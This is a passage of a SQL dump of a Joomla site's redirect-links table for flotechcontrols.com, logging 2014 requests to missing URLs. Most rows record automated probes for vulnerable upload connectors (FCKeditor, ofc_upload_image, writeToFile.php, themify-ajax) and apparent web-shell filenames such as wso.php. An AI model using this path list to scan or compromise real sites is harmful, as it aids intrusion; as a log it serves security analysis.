(262, 'http://FLOTECHCONTROLS.COM/modules/fckeditor/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 'http://FLOTECHCONTROLS.COM/modules/fckeditor/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 1, 0, '2014-02-12 01:18:07', '0000-00-00 00:00:00'),
(263, 'http://FLOTECHCONTROLS.COM/js/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 'http://FLOTECHCONTROLS.COM/js/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 1, 0, '2014-02-12 05:27:44', '0000-00-00 00:00:00'),
(264, 'http://FLOTECHCONTROLS.COM/manager/ispmgr', '', 'http://FLOTECHCONTROLS.COM/manager/ispmgr', '', 1, 0, '2014-02-12 09:24:54', '0000-00-00 00:00:00'),
(265, 'http://FLOTECHCONTROLS.COM/manager/', '', 'http://FLOTECHCONTROLS.COM/manager/', '', 1, 0, '2014-02-12 09:24:54', '0000-00-00 00:00:00'),
(266, 'http://FLOTECHCONTROLS.COM/ispmgr', '', 'http://FLOTECHCONTROLS.COM/ispmgr', '', 1, 0, '2014-02-12 09:24:55', '0000-00-00 00:00:00'),
(267, 'http://flotechcontrols.com//components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2014-02-12 19:57:18', '0000-00-00 00:00:00'),
(268, 'http://www.flotechcontrols.com/old//wp-login.php', '', '', '', 1, 0, '2014-02-14 19:26:38', '0000-00-00 00:00:00'),
(269, 'http://www.flotechcontrols.com/node/add/forum', '', '', '', 1, 0, '2014-02-16 03:35:46', '0000-00-00 00:00:00'),
(270, 'http://flotechcontrols.com/_admin/', '', '', '', 1, 0, '2014-02-18 06:10:17', '0000-00-00 00:00:00'),
(271, 'http://flotechcontrols.com/store_closed.html', '', '', '', 1, 0, '2014-02-18 06:10:21', '0000-00-00 00:00:00'),
(272, 'http://flotechcontrols.com/password.php', '', '', '', 1, 0, '2014-02-18 06:10:23', '0000-00-00 00:00:00'),
(273, 'http://flotechcontrols.com/modules/mod_joomcashe/joomcashe.php', '', '', '', 1, 0, '2014-02-20 10:49:21', '0000-00-00 00:00:00'),
(274, 'http://flotechcontrols.com/modules/mod_msn/mod_msn.php', '', '', '', 1, 0, '2014-02-20 14:08:42', '0000-00-00 00:00:00'),
(275, 'http://flotechcontrols.com/wp-includes/js/tinymce/themes/advanced/about.htm', '', '', '', 1, 0, '2014-02-20 15:24:28', '0000-00-00 00:00:00'),
(276, 'http://flotechcontrols.com/do/reg.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:48:53', '0000-00-00 00:00:00'),
(277, 'http://flotechcontrols.com/robots', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:03', '0000-00-00 00:00:00'),
(278, 'http://flotechcontrols.com/admin/help/online_help_1.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:03', '0000-00-00 00:00:00'),
(279, 'http://flotechcontrols.com/ask', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:13', '0000-00-00 00:00:00'),
(280, 'http://flotechcontrols.com/admin/template/article_more/config.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:19', '0000-00-00 00:00:00'),
(281, 'http://flotechcontrols.com/digg.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:26', '0000-00-00 00:00:00'),
(282, 'http://flotechcontrols.com/special', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:37', '0000-00-00 00:00:00'),
(283, 'http://flotechcontrols.com/member/template/homepage.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:40', '0000-00-00 00:00:00'),
(284, 'http://flotechcontrols.com/admin/template/foot.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:49:57', '0000-00-00 00:00:00'),
(285, 'http://flotechcontrols.com/template/default/refreshto.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:50:11', '0000-00-00 00:00:00'),
(286, 'http://flotechcontrols.com/data', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:50:18', '0000-00-00 00:00:00'),
(287, 'http://flotechcontrols.com/admin/list.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:50:30', '0000-00-00 00:00:00'),
(288, 'http://flotechcontrols.com/hack/gather/template/edit_title.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:50:39', '0000-00-00 00:00:00'),
(289, 'http://flotechcontrols.com/dede/login.php?gotopage=%2Fdede%2F', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:50:39', '0000-00-00 00:00:00'),
(290, 'http://flotechcontrols.com/admin/licence', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:50:41', '0000-00-00 00:00:00'),
(291, 'http://flotechcontrols.com/admin', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:50:42', '0000-00-00 00:00:00'),
(292, 'http://flotechcontrols.com/index.php/i', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:01', '0000-00-00 00:00:00'),
(293, 'http://flotechcontrols.com/install/templates/step-1.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:02', '0000-00-00 00:00:00'),
(294, 'http://flotechcontrols.com/template/home.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:13', '0000-00-00 00:00:00'),
(295, 'http://flotechcontrols.com/admin/tpl/showmessage.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:34', '0000-00-00 00:00:00'),
(296, 'http://flotechcontrols.com/system/skins/default/system.login.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:36', '0000-00-00 00:00:00'),
(297, 'http://flotechcontrols.com/install/templates/header.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:44', '0000-00-00 00:00:00'),
(298, 'http://flotechcontrols.com/99billdo.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:48', '0000-00-00 00:00:00'),
(299, 'http://flotechcontrols.com/admin/tpl/footer.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:51:55', '0000-00-00 00:00:00'),
(300, 'http://flotechcontrols.com/media/blogs/index.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:52:02', '0000-00-00 00:00:00'),
(301, 'http://flotechcontrols.com/login.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:52:04', '0000-00-00 00:00:00'),
(302, 'http://flotechcontrols.com/leiame.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:52:14', '0000-00-00 00:00:00'),
(303, 'http://flotechcontrols.com/custom/README', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:52:30', '0000-00-00 00:00:00'),
(304, 'http://flotechcontrols.com/Southidceditor/Dialog/about.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:52:52', '0000-00-00 00:00:00'),
(305, 'http://flotechcontrols.com/index.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:52:58', '0000-00-00 00:00:00'),
(306, 'http://flotechcontrols.com/Dialog/about.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:00', '0000-00-00 00:00:00'),
(307, 'http://flotechcontrols.com/themes/lazycms/home.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:08', '0000-00-00 00:00:00'),
(308, 'http://flotechcontrols.com/templates/cn/html/about.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:10', '0000-00-00 00:00:00'),
(309, 'http://flotechcontrols.com/agent/templates/Smarty/utf-8/footer.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:11', '0000-00-00 00:00:00'),
(310, 'http://flotechcontrols.com/js/index.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:21', '0000-00-00 00:00:00'),
(311, 'http://flotechcontrols.com/admin/Southidceditor/Dialog/about.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:23', '0000-00-00 00:00:00'),
(312, 'http://flotechcontrols.com/templates/default/cn/public/footer.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:29', '0000-00-00 00:00:00'),
(313, 'http://flotechcontrols.com/phpldapadmin', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:31', '0000-00-00 00:00:00'),
(314, 'http://flotechcontrols.com/install/templates/default/errorinfo.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:37', '0000-00-00 00:00:00'),
(315, 'http://flotechcontrols.com/eWebEditor/Dialog/about.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:41', '0000-00-00 00:00:00'),
(316, 'http://flotechcontrols.com/templet/default/', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:42', '0000-00-00 00:00:00'),
(317, 'http://flotechcontrols.com/pla', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:42', '0000-00-00 00:00:00'),
(318, 'http://flotechcontrols.com/templates/default/en/public/footer.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:53:50', '0000-00-00 00:00:00'),
(319, 'http://flotechcontrols.com/templates/default/cn/public/fotter.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:01', '0000-00-00 00:00:00'),
(320, 'http://flotechcontrols.com/install/templates/default/footer.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:07', '0000-00-00 00:00:00'),
(321, 'http://flotechcontrols.com/templates/default/en/public/fotter.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:11', '0000-00-00 00:00:00'),
(322, 'http://flotechcontrols.com/editor/Dialog/about.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:13', '0000-00-00 00:00:00'),
(323, 'http://flotechcontrols.com/templates/default/header.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:18', '0000-00-00 00:00:00'),
(324, 'http://flotechcontrols.com/minica_down.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:25', '0000-00-00 00:00:00'),
(325, 'http://flotechcontrols.com/extmail/README', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:26', '0000-00-00 00:00:00'),
(326, 'http://flotechcontrols.com/README', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:26', '0000-00-00 00:00:00'),
(327, 'http://flotechcontrols.com/templates/default/footer.php', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:29', '0000-00-00 00:00:00'),
(328, 'http://flotechcontrols.com/announcement/index.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:37', '0000-00-00 00:00:00'),
(329, 'http://flotechcontrols.com/docs/index.html', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:37', '0000-00-00 00:00:00'),
(330, 'http://flotechcontrols.com/cuteeditor_files/Help/default.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:54:42', '0000-00-00 00:00:00'),
(331, 'http://flotechcontrols.com/Help/default.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:55:15', '0000-00-00 00:00:00'),
(332, 'http://flotechcontrols.com/editor/Help/default.htm', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:55:37', '0000-00-00 00:00:00'),
(333, 'http://flotechcontrols.com/ChangeLog', '', 'http://www.baidu.com', '', 1, 0, '2014-02-26 17:56:05', '0000-00-00 00:00:00'),
(334, 'http://www.flotechcontrols.com/blog/wp-login.php', '', '', '', 1, 0, '2014-02-27 17:12:03', '0000-00-00 00:00:00'),
(335, 'http://flotechcontrols.com/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php', '', 'none', '', 1, 0, '2014-03-12 11:54:35', '0000-00-00 00:00:00'),
(336, 'http://flotechcontrols.com/images/pst.php', '', 'http://flotechcontrols.com', '', 1, 0, '2014-03-12 11:54:36', '0000-00-00 00:00:00'),
(337, 'http://www.flotechcontrols.com/js/fckeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(338, 'http://www.flotechcontrols.com/fckeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(339, 'http://www.flotechcontrols.com/include/fckeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(340, 'http://www.flotechcontrols.com/admin/FCKeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(341, 'http://www.flotechcontrols.com/fckeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(342, 'http://www.flotechcontrols.com/js/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(343, 'http://www.flotechcontrols.com/include/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(344, 'http://www.flotechcontrols.com/js/fckeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(345, 'http://www.flotechcontrols.com/include/fckeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(346, 'http://www.flotechcontrols.com/admin/FCKeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-12 14:30:13', '0000-00-00 00:00:00'),
(347, 'http://www.flotechcontrols.com//admin/FCKeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(348, 'http://www.flotechcontrols.com//include/fckeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(349, 'http://www.flotechcontrols.com//js/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00');
INSERT INTO `j6kpf_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(350, 'http://www.flotechcontrols.com//js/fckeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(351, 'http://www.flotechcontrols.com//fckeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(352, 'http://www.flotechcontrols.com//admin/FCKeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(353, 'http://www.flotechcontrols.com//include/fckeditor/_samples/default.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(354, 'http://www.flotechcontrols.com//admin/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(355, 'http://www.flotechcontrols.com//fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(356, 'http://www.flotechcontrols.com//fckeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(357, 'http://www.flotechcontrols.com//js/fckeditor/editor/fckeditor.html', '', '', '', 1, 0, '2014-03-16 12:31:53', '0000-00-00 00:00:00'),
(358, 'http://www.flotechcontrols.com//include/fckeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-03-16 12:31:54', '0000-00-00 00:00:00'),
(359, 'http://flotechcontrols.com/wp-content/plugins/tell-a-friend/tell-a-friend.php', '', 'http://flotechcontrols.com/wp-content/plugins/tell-a-friend/tell-a-friend.php', '', 1, 0, '2014-03-17 18:04:13', '0000-00-00 00:00:00'),
(360, 'http://flotechcontrols.com/components/com_ag_google_analytics2/in.php', '', '', '', 1, 0, '2014-03-20 00:41:49', '0000-00-00 00:00:00'),
(361, 'http://flotechcontrols.com/modules/mod_art/mod_art.php', '', '', '', 1, 0, '2014-03-20 03:25:36', '0000-00-00 00:00:00'),
(362, 'http://flotechcontrols.com/libraries/libraries.php', '', '', '', 1, 0, '2014-03-21 05:00:43', '0000-00-00 00:00:00'),
(363, 'http://flotechcontrols.com/components/com_jnews/includes/openflashchart/tmp-upload-images/menu.php', '', '', '', 1, 0, '2014-03-22 00:22:18', '0000-00-00 00:00:00'),
(364, 'http://flotechcontrols.com/modules/mod_articless/mod_articless.php', '', '', '', 1, 0, '2014-03-22 07:14:13', '0000-00-00 00:00:00'),
(365, 'http://flotechcontrols.com/cache/jm.php', '', '', '', 1, 0, '2014-03-24 04:50:16', '0000-00-00 00:00:00'),
(366, 'http://flotechcontrols.com/administrator/jm.php', '', '', '', 1, 0, '2014-03-24 04:50:16', '0000-00-00 00:00:00'),
(367, 'http://flotechcontrols.com/modules/mod_googlemapsapi/mod_googlemapsapi.php', '', '', '', 1, 0, '2014-03-24 05:14:28', '0000-00-00 00:00:00'),
(368, 'http://flotechcontrols.com/administrator/config.php', '', '', '', 1, 0, '2014-03-24 17:02:57', '0000-00-00 00:00:00'),
(369, 'http://flotechcontrols.com/modules/mod_zetta/zetta.php', '', '', '', 1, 0, '2014-03-25 06:32:09', '0000-00-00 00:00:00'),
(370, 'http://flotechcontrols.com/modules/mod_bing/mod_bing.php', '', '', '', 1, 0, '2014-03-25 06:32:09', '0000-00-00 00:00:00'),
(371, 'http://flotechcontrols.com/components/com_hello/views/dlll.php', '', '', '', 1, 0, '2014-03-25 07:58:26', '0000-00-00 00:00:00'),
(372, 'http://flotechcontrols.com/administrator/modules/mod_custom/view.php', '', '', '', 1, 0, '2014-03-26 06:28:34', '0000-00-00 00:00:00'),
(373, 'http://flotechcontrols.com/components/com_jnews/includes/openflashchart/tmp-upload-images/a1.php', '', '', '', 1, 0, '2014-03-26 07:16:32', '0000-00-00 00:00:00'),
(374, 'http://flotechcontrols.com/modules/img/mode.php', '', '', '', 1, 0, '2014-03-26 16:10:10', '0000-00-00 00:00:00'),
(375, 'http://flotechcontrols.com/includes/img/mode.php', '', '', '', 1, 0, '2014-03-27 03:54:54', '0000-00-00 00:00:00'),
(376, 'http://flotechcontrols.com/tmp/old.php', '', '', '', 1, 0, '2014-03-27 15:03:51', '0000-00-00 00:00:00'),
(377, 'http://flotechcontrols.com/UNKNOWN', '', '', '', 1, 0, '2014-03-28 09:04:45', '0000-00-00 00:00:00'),
(378, 'http://www.flotechcontrols.com/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php', '', '', '', 1, 0, '2014-03-29 14:22:45', '0000-00-00 00:00:00'),
(379, 'http://www.flotechcontrols.com/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php', '', '', '', 1, 0, '2014-03-29 14:22:46', '0000-00-00 00:00:00'),
(380, 'http://flotechcontrols.com/images/stcchatcc.php', '', '', '', 1, 0, '2014-03-31 03:00:29', '0000-00-00 00:00:00'),
(381, 'http://flotechcontrols.com/modules/mod_index/mod_index.php', '', '', '', 1, 0, '2014-03-31 03:00:35', '0000-00-00 00:00:00'),
(382, 'http://flotechcontrols.com/components/com_hello/views/hello/by.php', '', '', '', 1, 0, '2014-03-31 03:24:41', '0000-00-00 00:00:00'),
(383, 'http://flotechcontrols.com/components/com_user/models/log.php', '', '', '', 1, 0, '2014-03-31 03:24:42', '0000-00-00 00:00:00'),
(384, 'http://flotechcontrols.com/confiq.php', '', '', '', 1, 0, '2014-03-31 03:31:39', '0000-00-00 00:00:00'),
(385, 'http://flotechcontrols.com/administrator/ndong.php', '', '', '', 1, 0, '2014-03-31 03:48:51', '0000-00-00 00:00:00'),
(386, 'http://flotechcontrols.com/modules/mod_mail/mod_mail.php', '', '', '', 1, 0, '2014-03-31 04:05:17', '0000-00-00 00:00:00'),
(387, 'http://flotechcontrols.com/update.php', '', '', '', 1, 0, '2014-03-31 04:25:15', '0000-00-00 00:00:00'),
(388, 'http://flotechcontrols.com/modules/mod_twit/mod_twit.php', '', '', '', 1, 0, '2014-03-31 05:59:03', '0000-00-00 00:00:00'),
(389, 'http://flotechcontrols.com/images/babus.php', '', '', '', 1, 0, '2014-03-31 18:40:51', '0000-00-00 00:00:00'),
(390, 'http://flotechcontrols.com/images/upgrade.php', '', '', '', 1, 0, '2014-03-31 19:01:53', '0000-00-00 00:00:00'),
(391, 'http://flotechcontrols.com/images/webadmin.php', '', '', '', 1, 0, '2014-03-31 19:27:06', '0000-00-00 00:00:00'),
(392, 'http://flotechcontrols.com/plugins/user/confa.php', '', '', '', 1, 0, '2014-04-01 00:39:13', '0000-00-00 00:00:00'),
(393, 'http://flotechcontrols.com/plugins/system/core/core.php', '', '', '', 1, 0, '2014-04-01 01:43:12', '0000-00-00 00:00:00'),
(394, 'http://flotechcontrols.com/components/com_userprofiles/userprofiles.php', '', '', '', 1, 0, '2014-04-01 05:23:05', '0000-00-00 00:00:00'),
(395, 'http://flotechcontrols.com/images/wso.php', '', '', '', 1, 0, '2014-04-01 06:06:18', '0000-00-00 00:00:00'),
(396, 'http://flotechcontrols.com/components/com_banners/models/mod.php', '', '', '', 1, 0, '2014-04-01 06:11:40', '0000-00-00 00:00:00'),
(397, 'http://flotechcontrols.com/modules/mod_footer/tmpl/media-views-rtl.php', '', '', '', 1, 0, '2014-04-01 06:11:41', '0000-00-00 00:00:00'),
(398, 'http://flotechcontrols.com/modules/mod_poll/tmpl/installer.php', '', '', '', 1, 0, '2014-04-01 06:48:19', '0000-00-00 00:00:00'),
(399, 'http://flotechcontrols.com/images/function.php', '', '', '', 1, 0, '2014-04-01 06:48:19', '0000-00-00 00:00:00'),
(400, 'http://flotechcontrols.com/images/inbex.php', '', '', '', 1, 0, '2014-04-01 08:49:41', '0000-00-00 00:00:00'),
(401, 'http://flotechcontrols.com/images/nextstyles.php', '', '', '', 1, 0, '2014-04-01 08:49:41', '0000-00-00 00:00:00'),
(402, 'http://flotechcontrols.com/components/com_flexicontent/librairies/phpthumb/s.php', '', '', '', 1, 0, '2014-04-01 19:28:16', '0000-00-00 00:00:00'),
(403, 'http://flotechcontrols.com/tmp/fix.php', '', '', '', 1, 0, '2014-04-01 20:36:36', '0000-00-00 00:00:00'),
(404, 'http://flotechcontrols.com/components/com_jvideodirect/tools/uploader/php/index.php', '', '', '', 1, 0, '2014-04-02 03:45:12', '0000-00-00 00:00:00'),
(405, 'http://flotechcontrols.com/components/com_flexicontent/librairies/phpthumb/a.php', '', '', '', 1, 0, '2014-04-02 04:13:32', '0000-00-00 00:00:00'),
(406, 'http://flotechcontrols.com/modules/mod_syndicate/media-views-rtl.php', '', '', '', 1, 0, '2014-04-02 05:50:54', '0000-00-00 00:00:00'),
(407, 'http://flotechcontrols.com/modules/mod_related_items/media-views-rtl.php', '', '', '', 1, 0, '2014-04-02 15:00:42', '0000-00-00 00:00:00'),
(408, 'http://flotechcontrols.com/images/mazen.php', '', '', '', 1, 0, '2014-04-02 15:00:47', '0000-00-00 00:00:00'),
(409, 'http://flotechcontrols.com/plugins/user/confwp.php', '', '', '', 1, 0, '2014-04-03 03:52:27', '0000-00-00 00:00:00'),
(410, 'http://flotechcontrols.com/404.php', '', '', '', 1, 0, '2014-04-03 06:54:18', '0000-00-00 00:00:00'),
(411, 'http://flotechcontrols.com/images/ct.php', '', '', '', 1, 0, '2014-04-03 06:54:18', '0000-00-00 00:00:00'),
(412, 'http://flotechcontrols.com/images/bimz.php', '', '', '', 1, 0, '2014-04-03 06:54:18', '0000-00-00 00:00:00'),
(413, 'http://flotechcontrols.com/includes/onewayout.php', '', '', '', 1, 0, '2014-04-03 08:21:21', '0000-00-00 00:00:00'),
(414, 'http://flotechcontrols.com/components/com_easybookreloaded/models/gallery.php', '', '', '', 1, 0, '2014-04-03 08:21:23', '0000-00-00 00:00:00'),
(415, 'http://flotechcontrols.com/tmp/locus.php', '', '', '', 1, 0, '2014-04-03 09:02:20', '0000-00-00 00:00:00'),
(416, 'http://flotechcontrols.com/components/com_contact/pp1.php', '', '', '', 1, 0, '2014-04-04 04:18:11', '0000-00-00 00:00:00'),
(417, 'http://flotechcontrols.com/includes/d.php', '', '', '', 1, 0, '2014-04-04 04:56:21', '0000-00-00 00:00:00'),
(418, 'http://flotechcontrols.com/administrator/modules/mod_feed/tmpl/help.php', '', '', '', 1, 0, '2014-04-04 07:12:00', '0000-00-00 00:00:00'),
(419, 'http://flotechcontrols.com/plugins/content/geshi/rtl.php', '', '', '', 1, 0, '2014-04-04 07:12:00', '0000-00-00 00:00:00'),
(420, 'http://flotechcontrols.com/templates/system/online.php', '', '', '', 1, 0, '2014-04-04 08:29:27', '0000-00-00 00:00:00'),
(421, 'http://flotechcontrols.com/tmp/ex.php', '', '', '', 1, 0, '2014-04-04 08:29:57', '0000-00-00 00:00:00'),
(422, 'http://flotechcontrols.com/components/com_flexicontent/librairies/index2.php', '', '', '', 1, 0, '2014-04-04 09:48:03', '0000-00-00 00:00:00'),
(423, 'http://flotechcontrols.com/modules/mod_articles_popular/wp-booter.php', '', '', '', 1, 0, '2014-04-04 09:54:41', '0000-00-00 00:00:00'),
(424, 'http://flotechcontrols.com/components/com_jooomlas/s.php', '', '', '', 1, 0, '2014-04-05 09:20:23', '0000-00-00 00:00:00'),
(425, 'http://flotechcontrols.com/CHANGELOG.php', '', '', '', 1, 0, '2014-04-05 10:58:04', '0000-00-00 00:00:00'),
(426, 'http://flotechcontrols.com/plugins/editors/xstandard/preview.php', '', '', '', 1, 0, '2014-04-05 11:42:53', '0000-00-00 00:00:00'),
(427, 'http://flotechcontrols.com/components/com_alphacontent/assets/phpThumb/q1w2.php', '', '', '', 1, 0, '2014-04-05 11:42:53', '0000-00-00 00:00:00'),
(428, 'http://flotechcontrols.com/plugins/user/php-4.5-help.php', '', '', '', 1, 0, '2014-04-05 11:42:53', '0000-00-00 00:00:00'),
(429, 'http://flotechcontrols.com//mambots/editors/fckeditor/editor/filemanager/browser/default/browser.html', '', '', '', 1, 0, '2014-04-07 23:53:35', '0000-00-00 00:00:00'),
(430, 'http://www.flotechcontrols.com//mambots/editors/fckeditor/editor/filemanager/browser/default/browser.html', '', '', '', 1, 0, '2014-04-07 23:53:38', '0000-00-00 00:00:00'),
(431, 'http://flotechcontrols.com/components/com_pagerankchecker/geopic.php', '', '', '', 1, 0, '2014-04-08 04:22:41', '0000-00-00 00:00:00'),
(432, 'http://flotechcontrols.com/templates/system/web.php', '', '', '', 1, 0, '2014-04-08 04:49:03', '0000-00-00 00:00:00'),
(433, 'http://flotechcontrols.com/modules/mod_imglog/mod_imglog.php', '', '', '', 1, 0, '2014-04-08 04:49:03', '0000-00-00 00:00:00'),
(434, 'http://flotechcontrols.com/administrator/components/com_content/models/fields/modal/includes.php', '', '', '', 1, 0, '2014-04-08 04:49:04', '0000-00-00 00:00:00'),
(435, 'http://flotechcontrols.com/plugins/editors-xtd/mosimage.php', '', '', '', 1, 0, '2014-04-08 05:07:42', '0000-00-00 00:00:00'),
(436, 'http://flotechcontrols.com/images/gallery.php', '', '', '', 1, 0, '2014-04-08 05:16:19', '0000-00-00 00:00:00'),
(437, 'http://flotechcontrols.com/administrator/help/en-GB/css/help.php', '', '', '', 1, 0, '2014-04-08 05:39:41', '0000-00-00 00:00:00'),
(438, 'http://flotechcontrols.com/modules/config/config.php', '', '', '', 1, 0, '2014-04-08 06:25:53', '0000-00-00 00:00:00'),
(439, 'http://flotechcontrols.com/includes/geopic.php', '', '', '', 1, 0, '2014-04-08 06:29:40', '0000-00-00 00:00:00'),
(440, 'http://www.flotechcontrols.com/wp-content/themes/Flatshop/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:38', '0000-00-00 00:00:00'),
(441, 'http://www.flotechcontrols.com/wp-content/themes/Magazine/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:39', '0000-00-00 00:00:00'),
(442, 'http://www.flotechcontrols.com/wp-content/themes/Flat', '', '', '', 1, 0, '2014-04-08 23:29:40', '0000-00-00 00:00:00'),
(443, 'http://www.flotechcontrols.com/wp-content/themes/Parallax/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:41', '0000-00-00 00:00:00'),
(444, 'http://www.flotechcontrols.com/wp-content/themes/Bold,', '', '', '', 1, 0, '2014-04-08 23:29:42', '0000-00-00 00:00:00'),
(445, 'http://www.flotechcontrols.com/wp-content/themes/Pinshop/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:43', '0000-00-00 00:00:00'),
(446, 'http://www.flotechcontrols.com/wp-content/themes/Agency/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:44', '0000-00-00 00:00:00'),
(447, 'http://www.flotechcontrols.com/wp-content/themes/Slide/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:44', '0000-00-00 00:00:00'),
(448, 'http://www.flotechcontrols.com/wp-content/themes/Postline/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:45', '0000-00-00 00:00:00'),
(449, 'http://www.flotechcontrols.com/wp-content/themes/Fullscreen/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:46', '0000-00-00 00:00:00'),
(450, 'http://www.flotechcontrols.com/wp-content/themes/Pinboard/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:47', '0000-00-00 00:00:00'),
